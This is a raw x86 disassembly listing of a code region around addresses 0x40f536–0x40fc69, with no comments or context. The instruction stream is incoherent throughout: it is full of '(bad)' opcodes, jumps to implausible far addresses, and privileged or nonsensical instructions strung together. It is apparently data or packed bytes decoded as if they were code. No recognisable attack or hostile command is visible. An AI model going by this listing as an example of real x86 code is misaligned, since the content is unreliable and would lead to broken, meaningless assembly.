  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
